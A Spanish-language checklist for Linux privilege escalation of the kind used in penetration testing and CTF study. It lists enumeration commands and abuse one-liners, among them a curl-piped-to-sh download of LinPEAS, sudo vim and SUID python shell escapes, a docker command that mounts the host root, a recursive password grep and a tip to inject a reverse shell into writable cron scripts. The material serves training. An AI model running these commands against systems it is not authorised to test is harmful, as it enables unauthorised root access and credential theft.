---
title: Checklist de Escalada de Privilegios en Linux
pubDate: 2026-05-22
---

## ¿Qué es la Escalada de Privilegios?
Es el proceso de obtener un nivel de acceso superior al que se tiene actualmente (ej: de un usuario de servicio `www-data` a un usuario personal, o de usuario a `root`). Se basa en encontrar fallos de configuración, software desactualizado o credenciales expuestas en el sistema.

### Riesgos principales
1.  **Control Total:** El acceso root permite leer, modificar o borrar cualquier archivo y controlar todos los procesos.
2.  **Persistencia:** Un atacante con privilegios puede instalar backdoors permanentes.
3.  **Movimiento Lateral:** Acceso a llaves SSH o sesiones que permiten saltar a otros servidores de la red.

---

## 🚀 1. Enumeración Rápida & Automatizada
Antes de empezar manualmente, busca la "fruta madura" con herramientas:

*   **LinPEAS:** `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
*   **Linux Exploit Suggester:** Ideal para buscar Kernel Exploits (DirtyCow, etc).
*   **Pspy:** Monitoriza procesos y tareas cron en tiempo real sin ser root.
*   **Linux Smart Enumeration:** `lse.sh` - Muy claro y por niveles de detalle.

---

## 🔎 2. Enumeración Manual (La Base)

### Información del Sistema
```bash
hostname                # Nombre de la máquina
uname -a                # Versión del Kernel (Buscar exploits específicos)
cat /etc/*-release      # Distribución exacta (Ubuntu, CentOS, etc.)
env                     # Variables de entorno (¿Contraseñas en el PATH?)
```

### Usuarios y Grupos
```bash
whoami
id                      # ¡CRÍTICO! Grupos peligrosos: docker, lxd, sudo, adm, disk
sudo -l                 # ¡LO PRIMERO QUE HAY QUE HACER! Ver qué puedes ejecutar como root
cat /etc/passwd | cut -d: -f1    # Listar todos los usuarios
```

### Red e Infraestructura Interna
```bash
ss -tunlp               # Puertos escuchando solo en local (127.0.0.1)
ip a                    # Interfaces de red (¿Otras subredes?)
```

---

## 🛠️ 3. Abusando de SUDO (`sudo -l`)
Si puedes ejecutar binarios con `SUDO`, consulta siempre **[GTFOBins](https://gtfobins.github.io/)**.

*   **Editores (Vim/Nano):** `sudo vim -c ':!/bin/sh'`
*   **Paginadores (Less/More):** Escribe `!/bin/sh` dentro del programa.
*   **LD_PRELOAD:** Si ves esta opción activa, puedes cargar una librería `.so` maliciosa al ejecutar cualquier comando permitido.

---

## 🎯 4. Permisos SUID y SGID
Busca archivos que se ejecutan con los privilegios del dueño (root).

```bash
find / -perm -4000 2>/dev/null  # Buscar binarios SUID
```

### Exploits SUID Comunes:
*   **Systemctl:** Crear un servicio que cambie permisos a `/bin/bash`.
*   **Python:** `./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
*   **Pkexec:** CVE-2021-4034 (PwnKit).

---

## ⚙️ 5. Tareas Cron y Timers
Busca scripts que root ejecute automáticamente cada cierto tiempo.
```bash
cat /etc/crontab
ls -la /etc/cron.d/
```
*   **Vectores:** Si el script es editable, inyecta una reverse shell. Si el script no existe pero puedes crearlo, hazlo.

---

## 📦 6. Contenedores y Grupos Especiales

### Grupo Docker
Si estás en este grupo, puedes montar la raíz del host en un contenedor y ser root:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Grupo LXD / LXC
Si estás en el grupo `lxd`:
1.  Crea una imagen de Alpine.
2.  Iníciala montando el disco duro de la víctima en `/mnt/root`.
3.  Accede y tendrás control total de los archivos del host.

---

## 🔑 7. Archivos Sensibles y Secretos
*   **Shadow:** Si puedes leerlo, extrae los hashes y usa John/Hashcat.
*   **SSH Keys:** Busca carpetas `.ssh` y archivos `id_rsa`.
*   **Historial:** Revisa `.bash_history` en busca de contraseñas tecleadas por error.
*   **Grep masivo:** `grep -rEi "pass|pwd|credential" /home/ 2>/dev/null`

---

## ☣️ 8. Kernel Exploits (Último Recurso)
Usa solo si la máquina es antigua y nada de lo anterior funciona, ya que puede ser inestable.
*   **DirtyCow (CVE-2016-5195)**
*   **Baron Samedit (CVE-2021-3156)**
